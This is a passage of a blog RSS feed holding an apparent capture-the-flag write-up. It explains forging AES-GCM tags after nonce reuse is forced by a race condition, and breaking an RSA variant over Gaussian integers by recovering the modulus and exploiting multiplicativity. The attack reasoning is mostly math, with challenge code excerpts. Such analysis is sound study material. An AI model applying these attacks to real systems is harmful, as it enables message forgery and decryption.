&lt;p>GCM summarised: first encrypt the plaintext using CTR mode, then use ciphertext blocks as coefficients for a polynomial, compute it on a key-dependent point H, encrypt it, then return as an authentication tag.&lt;/p>
&lt;p>This challenge is quite different from the other two. First, we look at the secret key initialisation:&lt;/p>
&lt;pre>&lt;code class="language-python">with open(&amp;quot;/opt/flag/secret&amp;quot;, &amp;quot;rb&amp;quot;) as f:
tp = Aes256GcmTP(f.read())
&lt;/code>&lt;/pre>
&lt;p>This means the secret key is the same over all connections.&lt;/p>
&lt;p>Second, nonce initialisation:&lt;/p>
&lt;pre>&lt;code class="language-python"># this is the best way to avoid nonce reuse
now = int(time())
if now &amp;lt;= self.last_timestamp:
now = self.last_timestamp + 1
self.last_timestamp = now
nonce = now.to_bytes(12, &amp;quot;big&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>This obviously can be bypassed using race condition.&lt;/p>
&lt;p>Now we have an GCM oracle that uses same secret key and same nonce for all queries. That means the encryption is a stream cipher with same key $\Rightarrow$ we can forge ciphertext however we like.&lt;/p>
&lt;p>To forge the authentication tag, we need to look more closely at the math. The tag is computed as follow:&lt;/p>
&lt;ul>
&lt;li>Compute $H = E(0^{128})$.&lt;/li>
&lt;li>Compute $pad = E(nonce | 0^{31} | 1)$.&lt;/li>
&lt;li>Call $c_1, c_2$ the two blocks of the ciphertext.&lt;/li>
&lt;li>The tag is: $c_1 \cdot H^3 + c_2 \cdot H^2 + (len(A) | len(C)) \cdot H + pad$&lt;/li>
&lt;/ul>
&lt;p>Here we have $len(A) = 0, len(C) = 32 * 8 = 256$. All computation is on $GF(2^{128})$. This is a field, which means it has distributivity, a.k.a. $A(B+C) = AB + AC$. That means, consider 3 same-length ciphertext $c^1, c^2, c^3$, we have:&lt;/p>
&lt;p>$tag(c^1) + tag(c^2) + tag(c^3)$
$= (c^1_1 + c^2_1 + c^3_1) \cdot H^3 + (c^1_2 + c^2_2 + c^3_2) \cdot H_2 + (len(A) | len(C)) \cdot H + pad$
$= tag(c^1 + c^2 + c^3) $&lt;/p>
&lt;p>&lt;em>(reminder that addition in $GF(2^n)$ is the XOR operation)&lt;/em>&lt;/p>
&lt;p>Define $et = E(target)$ (ciphertext for $target$). If we can forge these 3 values:&lt;/p>
&lt;ul>
&lt;li>&lt;code>c1 = et[:16] + 00 * 16&lt;/code>&lt;/li>
&lt;li>&lt;code>c2 = 00 * 16 + et[16:]&lt;/code>&lt;/li>
&lt;li>&lt;code>c3 = 00 * 32&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>then we have $tag(c^1) + tag(c^2) + tag(c^3) = tag(c^1 + c^2 + c^3) = tag(E(target))$&lt;/p>
&lt;p>To construct $c^1, c^2, c^3$ we do as follow:&lt;/p>
&lt;ul>
&lt;li>Define $p = random(32 bytes)$&lt;/li>
&lt;li>Query $E(p)$.&lt;/li>
&lt;li>Compute $E(target) = E(p) \oplus p \oplus target$.&lt;/li>
&lt;li>Compute $p^1 = target \oplus (E(target)[:16] | (00 * 16))$&lt;/li>
&lt;li>Compute $p^2 = target \oplus ((00 * 16) | E(target)[16:])$&lt;/li>
&lt;li>Compute $p^3 = target \oplus E(target)$&lt;/li>
&lt;/ul>
&lt;p>Then it&amp;rsquo;s easy to see that $E(p^i) = c^i$.&lt;/p>
&lt;h1 id="rsa-with-gaussian-integers">RSA with Gaussian integers&lt;/h1>
&lt;p>The string we submit is split into 2 halves, each converted to an integer, combined together into a Complex number. This complex number is then RSA-ed, concatenated, and returned to us.&lt;/p>
&lt;p>We do not know $N$ and $e$.&lt;/p>
&lt;p>The multiplication function is this:&lt;/p>
&lt;pre>&lt;code class="language-python">def complex_mult(c1, c2, modulus):
return Complex(
(c1.re * c2.re - c1.im * c2.im) % modulus, # real part
(c1.re * c2.im + c1.im * c2.re) % modulus, # image part
)
&lt;/code>&lt;/pre>
&lt;p>We define $norm(a) = a.re^2 + a.im^2$.&lt;/p>
&lt;p>It&amp;rsquo;s easy to see that $norm$ is multiplicative. In other word: $norm(c1 \cdot c2) = norm(c1) \cdot norm(c2)$. This means that we have:&lt;/p>
&lt;p>$norm(s)^e \equiv norm(s^e) \equiv norm(E(s))\ (mod\ N)$&lt;/p>
&lt;p>which is regular RSA.&lt;/p>
&lt;p>To find $N$, we query 3 values: $E(2), E(4), E(8)$. We can see that:&lt;/p>
&lt;p>\begin{equation}
\begin{aligned}
E(2) \cdot E(2)
&amp;amp;\equiv 2^e \cdot 2^e \\&lt;br>
&amp;amp;\equiv 4^e \\&lt;br>
&amp;amp;\equiv E(4) \pmod N \\&lt;br>
\Leftrightarrow E(2)^2 - E(4) &amp;amp;\equiv 0\ \pmod N \\&lt;br>
\\&lt;br>
E(2) \cdot E(2) \cdot E(2)
&amp;amp;\equiv 2^e \cdot 2^e \cdot 2^e \\&lt;br>
&amp;amp;\equiv 8^e \\&lt;br>
&amp;amp;\equiv E(8) \pmod N \\&lt;br>
\Leftrightarrow E(2)^3 - E(8) &amp;amp;\equiv 0 \pmod N
\end{aligned}
\end{equation}&lt;/p>
&lt;p>From that, we have:&lt;/p>
&lt;p>$$N \mid GCD(E(2)^2 - E(4), E(2)^3 - E(8))$$&lt;/p>
&lt;p>Define $g = GCD(E(2)^2 - E(4), E(2)^3 - E(8))$. By experiment, we can see that most prime factors of $g$ (except for $p, q$) is small (no greater than 1000). We now have $N$. Then I spent the next 12 hours struggling to compute $e$, only to realise that I don&amp;rsquo;t need it :(&lt;/p>
&lt;p>It&amp;rsquo;s easy to see that:&lt;/p>
&lt;p>\begin{equation}
\begin{aligned}
E(2target) &amp;amp;\equiv E(2) \cdot E(target) \pmod N \\&lt;br>
\Leftrightarrow E(target) &amp;amp;\equiv E(2target) \cdot E(2)^{-1} \pmod N
\end{aligned}
\end{equation}&lt;/p>
&lt;p>$E(2)^{-1}\ mod\ N$ can be easily computed using extended Euclid alg (we already have $E(2)$ and $N$).&lt;/p>
&lt;p>Done.&lt;/p>
&lt;style>
.medium-zoom-image {
background-color: #fff;
}
&lt;/style></description></item><item><title/><link>https://lamnhh.github.io/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/about/</guid><description/></item><item><title/><link>https://lamnhh.github.io/admin/config.yml</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/admin/config.yml</guid><description/></item></channel></rss>